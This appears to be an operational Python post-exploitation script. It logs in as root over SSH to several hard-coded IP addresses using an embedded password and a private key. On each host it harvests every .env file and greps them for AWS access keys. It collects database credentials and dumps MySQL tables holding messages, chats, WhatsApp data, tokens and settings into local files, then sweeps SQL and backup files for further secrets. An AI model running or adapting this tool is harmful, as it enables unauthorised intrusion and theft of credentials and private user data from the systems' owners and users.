import io, os, re, sys, paramiko

PW = '9856#Edrafox'
KEY = open('/tmp/k/hml').read()
OUT = '/tmp/d3223'
os.makedirs(OUT, exist_ok=True)

def conn(h, u='root'):
    k = paramiko.Ed25519Key.from_private_key(io.StringIO(KEY))
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(h, 22, username=u, pkey=k, password=PW, timeout=25,
              banner_timeout=40, auth_timeout=40, allow_agent=False, look_for_keys=False)
    return c

def run(c, cmd, t=300, cap=200000):
    ch = c.get_transport().open_session(); ch.settimeout(t); ch.exec_command(cmd)
    b = []
    try:
        while True:
            d = ch.recv(65536)
            if not d: break
            b.append(d.decode('utf-8', 'replace'))
            if sum(len(x) for x in b) > cap: break
    except Exception as e:
        b.append('\n[EXC %s]\n' % type(e).__name__)
    return ''.join(b)

def sec(c, title, cmd, t=300, cap=120000):
    print('\n===== %s =====' % title, flush=True)
    print('$ ' + cmd[:300], flush=True)
    print(run(c, cmd, t, cap)[:cap], flush=True)

HOSTS = ['69.62.100.163', '72.62.14.56']
for H in HOSTS:
    print('\n\n################ HOST %s ################' % H, flush=True)
    try:
        c = conn(H)
    except Exception as e:
        print('[CONNFAIL] %s: %s' % (H, e), flush=True); continue
    try:
        sec(c, 'id', 'hostname; id; mkdir -p /tmp/d3223; ls /etc/easypanel/projects/ 2>/dev/null', 60, 4000)
        sec(c, 'envfiles',
            "find / -xdev -maxdepth 6 -type f \\( -name '.env' -o -name '.env.*' -o -name 'env' \\) "
            "2>/dev/null | grep -vE '/(proc|sys|usr|vendor|node_modules|dist|target)/' | head -80 | tee /tmp/e3223; wc -l /tmp/e3223",
            240, 12000)
        sec(c, 'envcat', 'while read f; do echo "### $f"; cat "$f" 2>/dev/null; echo; done < /tmp/e3223', 300, 160000)
        sec(c, 'envgrep',
            "while read f; do h=$(grep -aoE '.{0,220}(AKIA|ASIA)[0-9A-Z]{16}.{0,320}' \"$f\" 2>/dev/null); "
            "[ -n \"$h\" ] && { echo \"### $f\"; echo \"$h\"; }; done < /tmp/e3223", 300, 40000)
        sec(c, 'epenv',
            "for f in /etc/easypanel/projects/*/*/env; do [ -f \"$f\" ] || continue; echo \"### $f\"; cat \"$f\"; "
            "grep -aoE '.{0,220}(AKIA|ASIA)[0-9A-Z]{16}.{0,320}' \"$f\"; done", 180, 80000)

        # gather unique db creds
        creds = set()
        out = run(c, "while read f; do d=$(grep -aE '^DB_DATABASE=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); "
                     "u=$(grep -aE '^DB_USERNAME=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); "
                     "p=$(grep -aE '^DB_PASSWORD=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); "
                     "hh=$(grep -aE '^DB_HOST=' \"$f\" 2>/dev/null|head -1|cut -d= -f2-|tr -d '\\\"'); "
                     "[ -n \"$u\" ] && echo \"$hh|$u|$p|$d\"; done < /tmp/e3223 | sort -u", 240, 20000)
        print('\n===== DBCREDS =====\n' + out, flush=True)
        for line in out.splitlines():
            if line.count('|') == 3:
                creds.add(line.strip())
        creds.add('|root||')
        creds.add('127.0.0.1|root||')
        seen = set()
        dumps = []
        for cr in sorted(creds):
            hh, u, p, d = cr.split('|', 3)
            hh = hh or '127.0.0.1'
            if hh in ('localhost',): hh = '127.0.0.1'
            mc = ("MYSQL_PWD='%s' mysql --connect-timeout=6 -h '%s' -u '%s' -N -B -e " % (p, hh, u))
            if hh == '127.0.0.1' and not p:
                mc = "mysql --connect-timeout=6 -N -B -e "
            dbs = run(c, mc + "'show databases' 2>&1 | head -40", 90, 6000)
            print('\n---CRED %s user=%s db=%s -> %s' % (hh, u, d, dbs.replace('\n', ' ')[:400]), flush=True)
            if 'ERROR' in dbs or not dbs.strip(): continue
            key = (hh, u, p)
            if key in seen: continue
            seen.add(key)
            for db in [x for x in dbs.split() if x not in
                       ('information_schema', 'performance_schema', 'mysql', 'sys', 'Database')]:
                tbls = run(c, mc + "\"show tables from %s\" 2>&1 | head -200" % db, 90, 12000)
                inter = [t for t in tbls.split() if re.search(
                    r'messag|whatsapp|chat|conversa|setting|option|config|integrat|plugin|webhook|cron|deploy|token|instanc|tenant', t, re.I)]
                print('   DB %s tables=%d interesting=%s' % (db, len(tbls.split()), inter[:12]), flush=True)
                for t in inter[:14]:
                    cnt = run(c, mc + "\"select count(*) from %s.%s\" 2>&1 | tail -1" % (db, t), 90, 2000).strip()
                    n = int(cnt) if cnt.isdigit() else 0
                    fn = '%s/%s_%s_%s.tsv' % (OUT, H.replace('.', '_'), db.replace('.', '_'), t.replace('/', '_'))
                    col = run(c, mc + "\"select column_name from information_schema.columns where table_schema='%s' and table_name='%s' "
                                       "and column_name in ('id','created_at','updated_at','inserted_at','created','data_criacao') "
                                       "order by field(column_name,'id','created_at','updated_at','inserted_at','created','data_criacao') "
                                       "limit 1\" 2>/dev/null | tail -1" % (db, t), 60, 800).strip()
                    if 0 < n <= 4000:
                        run(c, "MYSQL_PWD='%s' mysqldump --connect-timeout=6 --single-transaction --skip-extended-insert --no-create-info "
                               "-h '%s' -u '%s' '%s' '%s' > '%s' 2>/dev/null || MYSQL_PWD='%s' mysql --connect-timeout=6 -h '%s' -u '%s' "
                               "-B -e 'select * from %s.%s' > '%s' 2>/dev/null"
                            % (p, hh, u, db, t, fn, p, hh, u, db, t, fn), 240, 2000)
                    elif col:
                        run(c, "MYSQL_PWD='%s' mysql --connect-timeout=6 -h '%s' -u '%s' -B -e "
                               "'select * from %s.%s order by %s desc limit 300' > '%s' 2>/dev/null"
                            % (p, hh, u, db, t, col, fn), 240, 2000)
                    else:
                        continue
                    dumps.append(fn)
        print('\n===== DUMPED FILES: %d =====' % len(dumps), flush=True)
        print('\n'.join(dumps), flush=True)

        # sweep all dumped files (plus any sql/bak found on disk that is small)
        sec(c, 'extra-files',
            "find /srv /var/www /home /root /opt /etc/easypanel -xdev -maxdepth 6 -type f \\( -name '*.sql' -o -name '*.bak' -o -name '*.env*' \\) "
            "-size -60M 2>/dev/null | head -40 | while read f; do r=$(grep -acE '(AKIA|ASIA)[0-9A-Z]{16}' \"$f\" 2>/dev/null); "
            "[ \"$r\" != \"0\" ] && echo \"HIT $r $f\"; done", 400, 8000)
        sec(c, 'dumphits',
            "for f in %s; do r=$(grep -aoE '.{0,300}(AKIA|ASIA)[0-9A-Z]{16}.{0,320}' \"$f\" 2>/dev/null | head -6); "
            "[ -n \"$r\" ] && { echo \"### $f\"; echo \"$r\"; }; done; echo '--- secret-ish ---'; "
            "for f in %s; do r=$(grep -aoiE '(aws_secret_access_key|secret_access_key|accesskeyid|aws_access_key_id)[^,}\\n]{0,80}' \"$f\" 2>/dev/null | sort -u | head -5); "
            "[ -n \"$r\" ] && { echo \"### $f\"; echo \"$r\"; }; done"
            % (' '.join("'%s'" % x for x in dumps) or '/dev/null', ' '.join("'%s'" % x for x in dumps) or '/dev/null'),
            400, 80000)
    except Exception as e:
        print('[HOSTERR] %s %s' % (H, e), flush=True)
    finally:
        try: c.close()
        except Exception: pass

# third host quick root-key attempt
print('\n\n################ HOST 178.156.202.159 ################', flush=True)
try:
    c = conn('178.156.202.159')
    print(run(c, 'id; ls /var/www', 60, 3000), flush=True)
    c.close()
except Exception as e:
    print('[CONNFAIL 178] %s' % e, flush=True)
print('=== END ===', flush=True)
